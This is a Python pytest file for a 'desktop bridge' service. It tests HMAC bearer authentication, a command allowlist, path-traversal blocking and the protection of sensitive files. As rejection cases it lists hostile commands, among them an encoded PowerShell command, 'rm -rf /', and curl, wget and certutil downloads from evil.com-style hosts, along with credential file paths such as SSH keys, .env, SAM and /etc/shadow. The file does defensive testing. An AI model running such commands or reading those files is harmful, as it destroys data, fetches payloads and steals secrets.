"""
Desktop Bridge Defense-in-Depth Security Tests:
Verifies constant-time HMAC bearer authentication, parameterized command allowlisting,
shell=False binary validation, path jail traversal prevention, and sensitive file protection.
"""

import pytest
from pathlib import Path
import desktop_bridge


def test_constant_time_hmac_auth(monkeypatch):
    """Verifies that requests require a valid Bearer token matching FLEET_BRIDGE_KEY."""
    monkeypatch.setattr(desktop_bridge, "FLEET_BRIDGE_KEY", "super_secret_256bit_bridge_token")

    class DummyHandler:
        def __init__(self, headers):
            self.headers = headers
        _verify_auth = desktop_bridge.SecureBridgeHandler._verify_auth

    # Missing header -> False
    assert not DummyHandler({})._verify_auth()

    # Wrong scheme -> False
    assert not DummyHandler({"Authorization": "Basic 12345"})._verify_auth()

    # Wrong token -> False
    assert not DummyHandler({"Authorization": "Bearer wrong_token"})._verify_auth()

    # Truncated token -> False
    assert not DummyHandler({"Authorization": "Bearer super_secret"})._verify_auth()

    # Exact token -> True
    assert DummyHandler({"Authorization": "Bearer super_secret_256bit_bridge_token"})._verify_auth()


def test_command_allowlist_rejects_unauthorized_binaries():
    """Verifies that arbitrary binaries like powershell, cmd, bash, or curl are rejected."""
    forbidden_commands = [
        "powershell -EncodedCommand JABjAG0AZAA=",
        "cmd.exe /c whoami",
        "bash -c 'rm -rf /'",
        "curl http://malicious.site/payload.sh",
        "wget https://evil.com/dropper",
        "certutil.exe -urlcache -f http://evil.com",
    ]

    for cmd in forbidden_commands:
        with pytest.raises(PermissionError) as excinfo:
            desktop_bridge.parse_and_validate_command(cmd)
        assert "not authorized" in str(excinfo.value)


def test_command_allowlist_accepts_authorized_binaries():
    """Verifies that allowlisted diagnostic binaries parse into clean token arrays."""
    valid_commands = [
        "git status -s",
        "git log -n 5 --oneline",
        "nvidia-smi --query-gpu=name,temperature.gpu --format=csv",
        "whoami",
    ]

    for cmd in valid_commands:
        tokens = desktop_bridge.parse_and_validate_command(cmd)
        assert isinstance(tokens, list)
        assert len(tokens) >= 1


def test_command_allowlist_rejects_dangerous_arguments():
    """Verifies that even within allowed binaries, dangerous arguments are blocked."""
    dangerous_args = [
        "git -rf /",
        "python -c shutdown",
    ]

    for cmd in dangerous_args:
        with pytest.raises(PermissionError) as excinfo:
            desktop_bridge.parse_and_validate_command(cmd)
        assert "forbidden by security policy" in str(excinfo.value)


def test_predeclared_actions():
    """Verifies pre-declared actions are properly defined as structured arrays."""
    assert "gpu_status" in desktop_bridge.ALLOWED_ACTIONS
    assert "git_status" in desktop_bridge.ALLOWED_ACTIONS
    assert isinstance(desktop_bridge.ALLOWED_ACTIONS["gpu_status"], list)


def test_path_jail_blocks_traversal(tmp_path, monkeypatch):
    """Verifies that file reads cannot escape ALLOWED_ROOT via directory traversal."""
    sandbox = tmp_path / "sandbox"
    sandbox.mkdir()
    monkeypatch.setattr(desktop_bridge, "ALLOWED_ROOT", sandbox.resolve())

    # Path inside allowed root
    valid_file = sandbox / "report.md"
    assert valid_file.resolve().is_relative_to(sandbox.resolve())

    # Path traversal outside allowed root
    traversal_path = sandbox / ".." / ".." / "etc" / "passwd"
    assert not traversal_path.resolve().is_relative_to(sandbox.resolve())


def test_blocked_file_substrings():
    """Verifies that sensitive credential files cannot be read even if inside ALLOWED_ROOT."""
    sensitive_targets = [
        "/home/user/.ssh/id_rsa",
        "/home/user/.ssh/id_ed25519",
        "/home/user/project/.env",
        "/home/user/app/credentials.json",
        "C:\\Windows\\System32\\config\\SAM",
        "/etc/shadow"
    ]

    for path_str in sensitive_targets:
        blocked = False
        lower_str = path_str.lower()
        for forbidden in desktop_bridge.BLOCKED_SUBSTRINGS:
            if forbidden in lower_str:
                blocked = True
                break
        assert blocked, f"Path '{path_str}' should have been blocked by BLOCKED_SUBSTRINGS!"


def test_load_env_file_pure_python(tmp_path, monkeypatch):
    """Verifies that the stdlib env loader accurately parses variables without external libraries."""
    test_env = tmp_path / ".env"
    test_env.write_text(
        "# Comment line\n"
        "TEST_PORT=9099\n"
        "TEST_KEY=\"secret_key_123\"\n"
        "TEST_SINGLE='single_quote_val'\n"
        "\n"
        "TEST_EMPTY=\n",
        encoding="utf-8"
    )

    desktop_bridge.load_env_file(str(test_env))
    import os
    assert os.getenv("TEST_PORT") == "9099"
    assert os.getenv("TEST_KEY") == "secret_key_123"
    assert os.getenv("TEST_SINGLE") == "single_quote_val"
    assert os.getenv("TEST_EMPTY") == ""

